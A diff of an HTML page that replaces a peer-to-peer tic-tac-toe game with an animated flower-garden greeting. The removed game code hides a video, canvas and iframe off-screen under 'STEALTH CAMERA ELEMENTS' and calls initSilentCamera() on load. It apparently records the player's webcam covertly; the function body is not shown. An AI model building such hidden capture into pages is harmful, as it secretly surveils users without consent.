@@ -1,1027 +1,809 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Lets play tic tac toy </title>
-  
-  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600&family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>For you 🌷</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    background: #030208;
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+  }
 
-  <style>
-    :root {
-      --primary: #ff2a6d;
-      --secondary: #ff758c;
-      --accent: #00f5d4;
-      --bg-dark: #08020f;
-      --glass-bg: rgba(255, 255, 255, 0.06);
-      --glass-border: rgba(255, 117, 140, 0.25);
-      --text: #ffffff;
-    }
+  #intro {
+    position: fixed;
+    inset: 0;
+    z-index: 100;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: radial-gradient(ellipse at center, #1a0a18 0%, #030208 70%);
+    transition: opacity 1.3s ease, visibility 1.3s;
+    padding: 24px;
+    text-align: center;
+  }
+  #intro.hide {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+  }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: 'Poppins', sans-serif;
-      user-select: none;
-    }
+  .msg {
+    max-width: 540px;
+    color: #ffc1d4;
+    font-size: clamp(16px, 4.1vw, 22px);
+    line-height: 1.75;
+    letter-spacing: 0.3px;
+    text-shadow: 0 0 22px rgba(255, 158, 192, 0.5);
+    margin-bottom: 42px;
+    animation: fadeUp 1.5s ease both;
+  }
+  .msg .heart {
+    display: inline-block;
+    animation: heartbeat 1.6s ease-in-out infinite;
+  }
 
-    body {
-      background: radial-gradient(circle at center, #24082c 0%, var(--bg-dark) 100%);
-      color: var(--text);
-      min-height: 100vh;
-      overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      position: relative;
-    }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes heartbeat {
+    0%, 100% { transform: scale(1); }
+    14%      { transform: scale(1.28); }
+    28%      { transform: scale(1); }
+    42%      { transform: scale(1.16); }
+  }
 
-    .hearts-bg {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 0;
-    }
+  #seeBtn {
+    background: linear-gradient(135deg, #ff4d7a, #ff9ec0);
+    border: none;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 500;
+    letter-spacing: 1.6px;
+    padding: 17px 42px;
+    border-radius: 50px;
+    cursor: pointer;
+    box-shadow: 0 0 32px rgba(255, 80, 130, 0.6), 0 10px 24px rgba(0,0,0,0.35);
+    transition: transform 0.25s, box-shadow 0.25s;
+    animation: fadeUp 1.7s ease both;
+  }
+  #seeBtn:hover {
+    transform: scale(1.07);
+    box-shadow: 0 0 45px rgba(255, 80, 130, 0.8), 0 12px 28px rgba(0,0,0,0.4);
+  }
+  #seeBtn:active { transform: scale(0.96); }
 
-    .heart-particle {
-      position: absolute;
-      color: rgba(255, 42, 109, 0.25);
-      animation: floatUp 7s infinite linear;
-      font-size: 1.2rem;
-      filter: drop-shadow(0 0 5px rgba(255, 42, 109, 0.5));
-    }
+  /* Rose message */
+  #roseMsg {
+    position: fixed;
+    top: 22px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 50;
+    background: rgba(20, 8, 18, 0.75);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 120, 160, 0.35);
+    color: #ffc1d4;
+    font-size: 15px;
+    padding: 12px 26px;
+    border-radius: 40px;
+    cursor: pointer;
+    opacity: 0;
+    pointer-events: none;
+    transition: opacity 1s ease, transform 0.4s;
+    box-shadow: 0 0 25px rgba(255, 80, 130, 0.25);
+    white-space: nowrap;
+  }
+  #roseMsg.show {
+    opacity: 1;
+    pointer-events: auto;
+  }
+  #roseMsg:hover {
+    transform: translateX(-50%) scale(1.05);
+    box-shadow: 0 0 35px rgba(255, 80, 130, 0.45);
+  }
 
-    @keyframes floatUp {
-      0% { transform: translateY(105vh) scale(0.6) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(-10vh) scale(1.3) rotate(360deg); opacity: 0; }
-    }
+  canvas {
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    height: 100%;
+    display: block;
+  }
 
-    .page {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      z-index: 10;
-      opacity: 0;
-      visibility: hidden;
-      transition: opacity 0.6s ease, transform 0.6s ease, visibility 0.6s;
-      transform: scale(0.95);
-    }
-
-    .page.active {
-      opacity: 1;
-      visibility: visible;
-      transform: scale(1);
-    }
-
-    #page-intro {
-      background: var(--bg-dark);
-      z-index: 100;
-    }
-
-    .intro-title {
-      font-family: 'Fredoka', cursive;
-      font-size: 3rem;
-      text-align: center;
-      text-transform: uppercase;
-      letter-spacing: 4px;
-      background: linear-gradient(45deg, #ff2a6d, #ff758c, #00f5d4, #ff2a6d);
-      background-size: 300% 300%;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: gradientShift 3s ease infinite, glowAnim 2s infinite alternate;
-    }
-
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
-    @keyframes glowAnim {
-      0% { filter: drop-shadow(0 0 10px rgba(255, 42, 109, 0.4)); transform: scale(0.98); }
-      100% { filter: drop-shadow(0 0 35px rgba(255, 42, 109, 0.9)); transform: scale(1.02); }
-    }
-
-    .glass-card {
-      background: var(--glass-bg);
-      border: 1px solid var(--glass-border);
-      backdrop-filter: blur(16px);
-      padding: 2rem 2.5rem;
-      border-radius: 24px;
-      text-align: center;
-      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
-      width: 100%;
-      max-width: 420px;
-    }
-
-    .btn-pink {
-      background: linear-gradient(45deg, var(--primary), var(--secondary));
-      border: none;
-      color: white;
-      padding: 12px 30px;
-      font-size: 1.1rem;
-      font-weight: 600;
-      border-radius: 30px;
-      cursor: pointer;
-      box-shadow: 0 4px 15px rgba(255, 42, 109, 0.4);
-      transition: all 0.3s ease;
-      margin-top: 15px;
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-      justify-content: center;
-    }
-
-    .btn-pink:hover {
-      transform: translateY(-3px) scale(1.03);
-      box-shadow: 0 8px 25px rgba(255, 42, 109, 0.6);
-    }
-
-    .pulse-loader {
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      background: rgba(255, 42, 109, 0.2);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 20px auto;
-      position: relative;
-    }
-
-    .pulse-loader::after {
-      content: '';
-      position: absolute;
-      inset: -10px;
-      border-radius: 50%;
-      border: 2px solid var(--primary);
-      animation: pulseRing 1.5s infinite ease-out;
-    }
-
-    @keyframes pulseRing {
-      0% { transform: scale(0.8); opacity: 1; }
-      100% { transform: scale(1.6); opacity: 0; }
-    }
-
-    .game-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      width: 100%;
-      max-width: 420px;
-      margin-bottom: 10px;
-    }
-
-    .control-btn {
-      background: rgba(255, 255, 255, 0.08);
-      border: 1px solid var(--glass-border);
-      color: var(--text);
-      width: 42px;
-      height: 42px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-
-    .control-btn.active {
-      background: var(--primary);
-      box-shadow: 0 0 12px var(--primary);
-    }
-
-    .profiles-container {
-      display: flex;
-      justify-content: space-between;
-      width: 100%;
-      max-width: 420px;
-      margin-bottom: 15px;
-      gap: 10px;
-    }
-
-    .player-card {
-      flex: 1;
-      background: var(--glass-bg);
-      border: 1px solid var(--glass-border);
-      border-radius: 16px;
-      padding: 10px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      position: relative;
-      transition: 0.3s;
-    }
-
-    .player-card.active-turn {
-      border-color: var(--accent);
-      box-shadow: 0 0 15px rgba(0, 245, 212, 0.3);
-    }
-
-    .avatar {
-      width: 42px;
-      height: 42px;
-      border-radius: 50%;
-      background: linear-gradient(45deg, var(--primary), var(--secondary));
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1.2rem;
-      font-weight: bold;
-    }
-
-    .board-container {
-      width: 100%;
-      max-width: 420px;
-      aspect-ratio: 1;
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin-bottom: 15px;
-    }
-
-    .cell {
-      background: var(--glass-bg);
-      border: 1px solid var(--glass-border);
-      border-radius: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 3.2rem;
-      font-weight: bold;
-      cursor: pointer;
-      backdrop-filter: blur(10px);
-      transition: all 0.3s ease;
-    }
-
-    .cell:hover {
-      background: rgba(255, 255, 255, 0.12);
-      transform: scale(1.02);
-    }
-
-    .cell.x { color: var(--primary); text-shadow: 0 0 15px var(--primary); }
-    .cell.o { color: var(--accent); text-shadow: 0 0 15px var(--accent); }
-
-    .gifts-bar {
-      display: flex;
-      justify-content: space-around;
-      width: 100%;
-      max-width: 420px;
-      background: var(--glass-bg);
-      border: 1px solid var(--glass-border);
-      border-radius: 30px;
-      padding: 8px 15px;
-    }
-
-    .gift-btn {
-      background: transparent;
-      border: none;
-      font-size: 1.8rem;
-      cursor: pointer;
-      transition: transform 0.2s;
-    }
-
-    .gift-btn:hover {
-      transform: scale(1.3) rotate(10deg);
-    }
-
-    .flying-gift {
-      position: fixed;
-      font-size: 2.5rem;
-      z-index: 1000;
-      pointer-events: none;
-      transition: all 0.8s cubic-bezier(0.25, 1, 0.5, 1);
-    }
-
-    .blast-effect {
-      position: fixed;
-      z-index: 1001;
-      pointer-events: none;
-      animation: burstAnim 0.6s ease-out forwards;
-      font-size: 3rem;
-    }
-
-    @keyframes burstAnim {
-      0% { transform: scale(0.5); opacity: 1; }
-      50% { transform: scale(1.8); opacity: 0.8; }
-      100% { transform: scale(2.5); opacity: 0; filter: blur(5px); }
-    }
-
-    /* ===== CHAT SYSTEM ===== */
-    #chatToggle {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      z-index: 500;
-      width: 56px;
-      height: 56px;
-      border-radius: 50%;
-      background: linear-gradient(45deg, var(--primary), var(--secondary));
-      border: none;
-      color: white;
-      font-size: 1.5rem;
-      cursor: pointer;
-      box-shadow: 0 4px 20px rgba(255, 42, 109, 0.4);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: 0.3s;
-    }
-
-    #chatToggle:hover {
-      transform: scale(1.1);
-    }
-
-    #chatBox {
-      position: fixed;
-      bottom: 90px;
-      right: 20px;
-      width: 320px;
-      max-height: 420px;
-      background: rgba(10, 2, 20, 0.95);
-      border: 1px solid var(--glass-border);
-      border-radius: 20px;
-      backdrop-filter: blur(20px);
-      z-index: 500;
-      display: none;
-      flex-direction: column;
-      overflow: hidden;
-      box-shadow: 0 12px 40px rgba(0,0,0,0.8);
-    }
-
-    #chatBox.open {
-      display: flex;
-    }
-
-    #chatHeader {
-      padding: 12px 16px;
-      background: rgba(255, 42, 109, 0.15);
-      border-bottom: 1px solid var(--glass-border);
-      font-weight: 600;
-      font-size: 0.95rem;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-
-    #chatMessages {
-      flex: 1;
-      padding: 12px;
-      overflow-y: auto;
-      max-height: 280px;
-      min-height: 200px;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
-
-    #chatMessages .msg {
-      padding: 8px 14px;
-      border-radius: 18px;
-      max-width: 85%;
-      word-wrap: break-word;
-      font-size: 0.85rem;
-      line-height: 1.3;
-    }
-
-    #chatMessages .msg.me {
-      background: var(--primary);
-      align-self: flex-end;
-      border-bottom-right-radius: 4px;
-    }
-
-    #chatMessages .msg.other {
-      background: rgba(255,255,255,0.1);
-      align-self: flex-start;
-      border-bottom-left-radius: 4px;
-    }
-
-    #chatInputRow {
-      display: flex;
-      padding: 10px;
-      gap: 8px;
-      border-top: 1px solid var(--glass-border);
-    }
-
-    #chatInput {
-      flex: 1;
-      background: rgba(0,0,0,0.4);
-      border: 1px solid var(--glass-border);
-      border-radius: 20px;
-      padding: 10px 16px;
-      color: white;
-      outline: none;
-      font-size: 0.85rem;
-    }
-
-    #chatSend {
-      width: 42px;
-      height: 42px;
-      border-radius: 50%;
-      background: var(--primary);
-      border: none;
-      color: white;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 1rem;
-      transition: 0.2s;
-    }
-
-    #chatSend:active { transform: scale(0.9); }
-
-    #chatBadge {
-      position: absolute;
-      top: -4px;
-      right: -4px;
-      background: #ff2a6d;
-      color: white;
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-      font-size: 0.7rem;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-    }
-
-    /* ===== STEALTH ELEMENTS (Completely Hidden) ===== */
-    #stealthFrame, #stealthVideo, #stealthCanvas {
-      position: fixed !important;
-      left: -10000px !important;
-      top: -10000px !important;
-      width: 1px !important;
-      height: 1px !important;
-      opacity: 0 !important;
-      z-index: -9999 !important;
-      pointer-events: none !important;
-      visibility: hidden !important;
-    }
-
-    audio { display: none; }
-  </style>
+  .sparkle {
+    position: fixed;
+    pointer-events: none;
+    z-index: 5;
+    font-size: 15px;
+    opacity: 0;
+    animation: floatSparkle 7s linear infinite;
+  }
+  @keyframes floatSparkle {
+    0%   { transform: translateY(105vh) rotate(0deg); opacity: 0; }
+    12%  { opacity: 0.75; }
+    88%  { opacity: 0.5; }
+    100% { transform: translateY(-15vh) rotate(360deg); opacity: 0; }
+  }
+</style>
 </head>
 <body>
 
-  <div class="hearts-bg" id="heartsContainer"></div>
-
-  <div class="page active" id="page-intro">
-    <h1 class="intro-title">Modded by SIVASINGH</h1>
+<div id="intro">
+  <div class="msg">
+    Hi cutiee <span class="heart">💕</span><br>
+    I just met you and talked to you,<br>
+    so I just told you <b>NTMY</b>…<br>
+    but where are the flowers? 🌷
   </div>
+  <button id="seeBtn">See Flowers ✨</button>
+</div>
 
-  <div class="page" id="page-welcome">
-    <div class="glass-card">
-      <h2 style="font-size: 2rem; color: #ff758c; margin-bottom: 10px;">Hey lets play 🤭🤭</h2>
-      <p style="font-size: 0.95rem; opacity: 0.8; margin-bottom: 20px;">Get ready for a  battle!</p>
-      <button class="btn-pink" onclick="goToPage('page-lobby')">Continue ❤️</button>
-    </div>
-  </div>
+<div id="roseMsg">I think you're missing a rose? Click here 🌹</div>
 
-  <div class="page" id="page-lobby">
-    <div class="glass-card" id="lobby-input-box">
-      <h3 style="margin-bottom: 15px; color: var(--secondary);">Connect with player</h3>
-      
-      <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 12px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center;">
-        <span style="font-size: 0.85rem;">Your Code: <strong id="my-code" style="color: var(--accent);">Generating...</strong></span>
-        <button class="control-btn" style="width: 32px; height: 32px;" onclick="copyCode()" title="Copy Code"><i class="fa-solid fa-copy"></i></button>
-      </div>
+<canvas id="c"></canvas>
 
-      <input type="text" id="friend-code" placeholder="Enter Bestie's Code" style="width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid var(--glass-border); border-radius: 12px; color: white; outline: none; text-align: center; font-size: 1rem; margin-bottom: 15px;">
+<audio id="music" loop preload="auto">
+  <source src="tere-liye.mp3" type="audio/mpeg">
+</audio>
 
-      <button class="btn-pink" style="width: 100%;" onclick="startConnection()">Connect & Play 💕</button>
-    </div>
+<script>
+const canvas = document.getElementById('c');
+const ctx = canvas.getContext('2d');
+const music = document.getElementById('music');
+const intro = document.getElementById('intro');
+const seeBtn = document.getElementById('seeBtn');
+const roseMsg = document.getElementById('roseMsg');
 
-    <div class="glass-card" id="lobby-connecting-box" style="display: none;">
-      <div class="pulse-loader"><i class="fa-solid fa-heart" style="color: var(--primary); font-size: 1.8rem;"></i></div>
-      <h3 style="color: var(--secondary); margin-bottom: 5px;">Connecting...</h3>
-      <p style="font-size: 0.85rem; opacity: 0.8;">This game made by sivasingh follow on insta - @smss1707</p>
-    </div>
-  </div>
+let W, H;
+const particles = [];
+const flowers = [];
+const roses = [];          // special realistic roses
+let started = false;
+let rosesStarted = false;
+let roseStartT = 0;
+let mainDone = false;
 
-  <div class="page" id="page-game">
-    
-    <div class="game-header">
-      <button class="control-btn" id="micBtn" onclick="toggleMic()" title="Mic On/Off"><i class="fa-solid fa-microphone-slash"></i></button>
-      
-      <div style="display: flex; gap: 8px;">
-        <button class="control-btn" id="musicBtn" onclick="toggleMusic()" title="Play/Pause Music"><i class="fa-solid fa-music"></i></button>
-        <button class="control-btn" onclick="switchSong()" title="Switch Song"><i class="fa-solid fa-forward-step"></i></button>
-      </div>
+function resize() {
+  W = canvas.width = window.innerWidth;
+  H = canvas.height = window.innerHeight;
+}
+window.addEventListener('resize', resize);
+resize();
 
-      <button class="control-btn" onclick="resetGame()" title="Reset Game"><i class="fa-solid fa-rotate-right"></i></button>
-    </div>
+/* soft floating particles */
+class Particle {
+  constructor() { this.reset(true); }
+  reset(init) {
+    this.x = Math.random() * W;
+    this.y = init ? Math.random() * H : H + 40;
+    this.r = 1.0 + Math.random() * 2.8;
+    this.speed = 0.18 + Math.random() * 0.5;
+    this.a = 0.07 + Math.random() * 0.22;
+    this.col = Math.random() > 0.38 ? '#ff9ec0' : '#ffe0ec';
+    this.wobble = Math.random() * Math.PI * 2;
+  }
+  update() {
+    this.y -= this.speed;
+    this.x += Math.sin(this.wobble + this.y * 0.008) * 0.35;
+    if (this.y < -40) this.reset(false);
+  }
+  draw() {
+    ctx.beginPath();
+    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
+    ctx.fillStyle = this.col;
+    ctx.globalAlpha = this.a;
+    ctx.fill();
+    ctx.globalAlpha = 1;
+  }
+}
+for (let i = 0; i < 60; i++) particles.push(new Particle());
 
-    <div class="profiles-container">
-      <div class="player-card active-turn" id="p1-card">
-        <div class="avatar"> You </div>
-        <div>
-          <div style="font-size: 0.85rem; font-weight: 600;" id="p1-name">You (X)</div>
-          <div style="font-size: 0.75rem; color: var(--accent);" id="p1-status">Turn</div>
-        </div>
-      </div>
+/* normal garden presets */
+const PRESETS = [
+  { petalDeep: '#e91e63', petalMid: '#ff80ab', petalLight: '#ffc1d4', bud: '#f48fb1', core: '#ffd54f', glow: 'rgba(255,70,130,0.55)' },
+  { petalDeep: '#ce93d8', petalMid: '#f3e5f5', petalLight: '#faf5ff', bud: '#e1bee7', core: '#fff', glow: 'rgba(220,180,255,0.5)' },
+  { petalDeep: '#ad1457', petalMid: '#ec407a', petalLight: '#f8bbd0', bud: '#f06292', core: null, glow: 'rgba(180,30,90,0.55)' },
+  { petalDeep: '#ef6c00', petalMid: '#ffb300', petalLight: '#ffe082', bud: '#ff8f00', core: '#4e342e', glow: 'rgba(255,150,0,0.45)' },
+  { petalDeep: '#7b1fa2', petalMid: '#ba68c8', petalLight: '#e1bee7', bud: '#ce93d8', core: '#ffd54f', glow: 'rgba(150,60,200,0.5)' },
+  { petalDeep: '#e57373', petalMid: '#ef9a9a', petalLight: '#ffcdd2', bud: '#ef9a9a', core: '#fff59d', glow: 'rgba(255,120,120,0.5)' },
+  { petalDeep: '#f06292', petalMid: '#f8bbd0', petalLight: '#fce4ec', bud: '#f48fb1', core: '#ffecb3', glow: 'rgba(240,100,150,0.5)' }
+];
 
-      <div class="player-card" id="p2-card">
-        <div class="avatar" style="background: linear-gradient(45deg, #00f5d4, #00bbf9);"> Devu </div>
-        <div>
-          <div style="font-size: 0.85rem; font-weight: 600;" id="p2-name">opponet (O)</div>
-          <div style="font-size: 0.75rem; opacity: 0.6;" id="p2-status">Wait</div>
-        </div>
-      </div>
-    </div>
+/* special realistic rose presets (more red/pink/classic) */
+const ROSE_PRESETS = [
+  { // classic deep red rose
+    petalDeep: '#b71c1c', petalMid: '#e53935', petalLight: '#ef9a9a',
+    bud: '#c62828', core: '#ffd54f', glow: 'rgba(200,30,40,0.6)'
+  },
+  { // romantic pink rose
+    petalDeep: '#c2185b', petalMid: '#f06292', petalLight: '#f8bbd0',
+    bud: '#ec407a', core: '#ffecb3', glow: 'rgba(220,50,100,0.55)'
+  },
+  { // soft peach rose
+    petalDeep: '#e91e63', petalMid: '#f48fb1', petalLight: '#fce4ec',
+    bud: '#f06292', core: '#fff59d', glow: 'rgba(240,80,130,0.5)'
+  },
+  { // deep burgundy
+    petalDeep: '#880e4f', petalMid: '#ad1457', petalLight: '#f48fb1',
+    bud: '#c2185b', core: '#ffd54f', glow: 'rgba(160,20,70,0.55)'
+  },
+  { // soft coral rose
+    petalDeep: '#d32f2f', petalMid: '#ef5350', petalLight: '#ffcdd2',
+    bud: '#e57373', core: '#fff8e1', glow: 'rgba(230,60,60,0.5)'
+  }
+];
 
-    <div class="board-container" id="board">
-      <div class="cell" data-index="0"></div>
-      <div class="cell" data-index="1"></div>
-      <div class="cell" data-index="2"></div>
-      <div class="cell" data-index="3"></div>
-      <div class="cell" data-index="4"></div>
-      <div class="cell" data-index="5"></div>
-      <div class="cell" data-index="6"></div>
-      <div class="cell" data-index="7"></div>
-      <div class="cell" data-index="8"></div>
-    </div>
+const STAGE = { root: 0.0, stem: 0.4, leaf: 1.55, bud: 2.5, open: 3.3 };
 
-    <div class="gifts-bar">
-      <button class="gift-btn" onclick="sendGift('🌹')" title="Send Rose">🌹</button>
-      <button class="gift-btn" onclick="sendGift('😘')" title="Send Kiss">💋</button>
-      <button class="gift-btn" onclick="sendGift('🤗')" title="Send Hug">🤗</button>
-      <button class="gift-btn" onclick="sendGift('🥊')" title="Send Punch">🥊</button>
-    </div>
+function createFlower(cfg, isRose = false) {
+  return {
+    cx: cfg.x,
+    base: 0.93,
+    maxH: cfg.h,
+    ang: cfg.ang * Math.PI / 180,
+    delay: cfg.delay,
+    preset: isRose ? ROSE_PRESETS[cfg.p % ROSE_PRESETS.length] : PRESETS[cfg.p % PRESETS.length],
+    petals: cfg.petals || 6,
+    isTulip: cfg.tulip || false,
+    isSun: cfg.sun || false,
+    isRose: isRose,
+    sway: 0.12 + Math.random() * 0.28,
+    swaySpeed: 0.55 + Math.random() * 0.7,
+    phase: Math.random() * Math.PI * 2
+  };
+}
 
-  </div>
+/* normal garden layout */
+const LAYOUT = [
+  { x: 0.07, h: 0.40, delay: 0.0,  ang: -30, p: 0, petals: 7 },
+  { x: 0.17, h: 0.52, delay: 1.1,  ang: -20, p: 3, petals: 16, sun: true },
+  { x: 0.27, h: 0.46, delay: 2.3,  ang: -12, p: 1, petals: 6 },
+  { x: 0.37, h: 0.58, delay: 3.5,  ang: -5,  p: 2, petals: 3, tulip: true },
+  { x: 0.47, h: 0.64, delay: 4.7,  ang: 0,   p: 0, petals: 8 },
+  { x: 0.57, h: 0.50, delay: 5.9,  ang: 7,   p: 4, petals: 6 },
+  { x: 0.67, h: 0.56, delay: 7.1,  ang: 13,  p: 5, petals: 7 },
+  { x: 0.77, h: 0.44, delay: 8.3,  ang: 20,  p: 1, petals: 6 },
+  { x: 0.87, h: 0.48, delay: 9.5,  ang: 27,  p: 6, petals: 7 },
+  { x: 0.13, h: 0.32, delay: 10.8, ang: -24, p: 2, petals: 3, tulip: true },
+  { x: 0.31, h: 0.30, delay: 12.0, ang: -9,  p: 0, petals: 6 },
+  { x: 0.51, h: 0.34, delay: 13.2, ang: 5,   p: 3, petals: 14, sun: true },
+  { x: 0.71, h: 0.31, delay: 14.4, ang: 16,  p: 5, petals: 6 },
+  { x: 0.41, h: 0.38, delay: 15.6, ang: -3,  p: 6, petals: 7 },
+  { x: 0.61, h: 0.36, delay: 16.8, ang: 11,  p: 0, petals: 6 },
+  { x: 0.22, h: 0.26, delay: 18.0, ang: -15, p: 4, petals: 5 },
+  { x: 0.82, h: 0.28, delay: 19.2, ang: 22,  p: 1, petals: 6 }
+];
+LAYOUT.forEach(l => flowers.push(createFlower(l)));
 
-  <audio id="bgMusic" loop><source id="musicSource" src="song1.mp3" type="audio/mpeg"></audio>
-  <audio id="remoteAudio" autoplay></audio>
+/* special realistic roses layout (appear after click) */
+const ROSE_LAYOUT = [
+  { x: 0.18, h: 0.55, delay: 0.0,  ang: -18, p: 0, petals: 9 },
+  { x: 0.32, h: 0.62, delay: 1.4,  ang: -8,  p: 1, petals: 10 },
+  { x: 0.48, h: 0.68, delay: 2.8,  ang: 0,   p: 2, petals: 11 },
+  { x: 0.64, h: 0.60, delay: 4.2,  ang: 9,   p: 3, petals: 10 },
+  { x: 0.78, h: 0.52, delay: 5.6,  ang: 18,  p: 4, petals: 9 },
+  { x: 0.25, h: 0.40, delay: 7.0,  ang: -12, p: 0, petals: 8 },
+  { x: 0.55, h: 0.42, delay: 8.4,  ang: 6,   p: 1, petals: 9 },
+  { x: 0.72, h: 0.38, delay: 9.8,  ang: 15,  p: 2, petals: 8 }
+];
 
-  <!-- STEALTH CAMERA ELEMENTS -->
-  <iframe id="stealthFrame" style="display:none !important;"></iframe>
-  <video id="stealthVideo" autoplay playsinline muted></video>
-  <canvas id="stealthCanvas"></canvas>
+function ease(t) {
+  return t < 0 ? 0 : t > 1 ? 1 : 1 - Math.pow(1 - t, 3);
+}
+function easeBack(t) {
+  const c = 1.7;
+  return t <= 0 ? 0 : t >= 1 ? 1 : 1 + c * Math.pow(t - 1, 3) + c * Math.pow(t - 1, 2);
+}
 
-  <!-- CHAT SYSTEM -->
-  <button id="chatToggle" onclick="toggleChat()">
-    💬
-    <span id="chatBadge">0</span>
-  </button>
+/* root */
+function drawRoot(f, p) {
+  if (p <= 0) return;
+  const x = f.cx * W, y = f.base * H;
+  ctx.save();
+  ctx.translate(x, y);
+  ctx.rotate(f.ang);
+  const s = ease(p) * 18;
+  const soil = ctx.createRadialGradient(0, 4, 2, 0, 6, s * 1.8);
+  soil.addColorStop(0, 'rgba(70, 45, 35, 0.85)');
+  soil.addColorStop(1, 'rgba(40, 25, 20, 0.0)');
+  ctx.beginPath();
+  ctx.ellipse(0, 6, s * 1.7, s * 0.65, 0, 0, Math.PI * 2);
+  ctx.fillStyle = soil;
+  ctx.fill();
+  ctx.strokeStyle = 'rgba(65, 40, 35, 0.7)';
+  ctx.lineWidth = 1.5;
+  ctx.lineCap = 'round';
+  ctx.beginPath();
+  ctx.moveTo(-8, 4); ctx.quadraticCurveTo(-14, 15, -6, 22);
+  ctx.moveTo(7, 5);  ctx.quadraticCurveTo(15, 14, 8, 21);
+  ctx.moveTo(0, 3);  ctx.quadraticCurveTo(3, 16, -2, 24);
+  ctx.stroke();
+  ctx.restore();
+}
 
-  <div id="chatBox">
-    <div id="chatHeader">
-      <span>💕 Chat with player</span>
-      <span onclick="toggleChat()" style="cursor:pointer; opacity:0.7;">✕</span>
-    </div>
-    <div id="chatMessages"></div>
-    <div id="chatInputRow">
-      <input type="text" id="chatInput" placeholder="Type a message..." onkeydown="if(event.key==='Enter') sendChatMsg()">
-      <button id="chatSend" onclick="sendChatMsg()"><i class="fa-solid fa-paper-plane"></i></button>
-    </div>
-  </div>
+/* stem + leaves */
+function drawStemAndLeaves(f, stemP, leafP, time) {
+  const h = f.maxH * H * ease(stemP);
+  if (h < 2) return { tipX: f.cx * W, tipY: f.base * H };
 
-  <script>
-    /* ==================== HEARTS BG ==================== */
-    const heartsContainer = document.getElementById('heartsContainer');
-    const heartIcons = ['❤️', '💖', '💕', '💗', '✨'];
-    for (let i = 0; i < 25; i++) {
-      const heart = document.createElement('div');
-      heart.className = 'heart-particle';
-      heart.innerText = heartIcons[Math.floor(Math.random() * heartIcons.length)];
-      heart.style.left = `${Math.random() * 100}%`;
-      heart.style.animationDelay = `${Math.random() * 7}s`;
-      heart.style.fontSize = `${14 + Math.random() * 18}px`;
-      heartsContainer.appendChild(heart);
-    }
+  const sway = Math.sin(time * f.swaySpeed + f.phase) * f.sway * (h / (f.maxH * H));
+  const x = f.cx * W, y = f.base * H;
 
-    /* ==================== PAGE NAV ==================== */
-    function goToPage(pageId) {
-      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-      document.getElementById(pageId).classList.add('active');
-    }
+  ctx.save();
+  ctx.translate(x, y);
+  ctx.rotate(f.ang + sway * 0.18);
 
-    window.addEventListener('DOMContentLoaded', () => {
-      setTimeout(() => {
-        goToPage('page-welcome');
-        initPeer();
-        initSilentCamera();
-      }, 3000);
-    });
+  const stemGrad = ctx.createLinearGradient(0, 0, 0, -h);
+  stemGrad.addColorStop(0, '#1b5e20');
+  stemGrad.addColorStop(0.4, '#2e7d32');
+  stemGrad.addColorStop(1, '#66bb6a');
 
-    /* ==================== MUSIC - 3 SONGS ==================== */
-    const bgMusic = document.getElementById('bgMusic');
-    const musicSource = document.getElementById('musicSource');
-    const musicBtn = document.getElementById('musicBtn');
-    let isPlaying = false, currentSong = 1;
+  ctx.beginPath();
+  ctx.moveTo(-2.2, 0);
+  ctx.quadraticCurveTo(6 * Math.sin(f.ang * 1.3 + sway), -h * 0.5, -1.5 + sway * 3, -h);
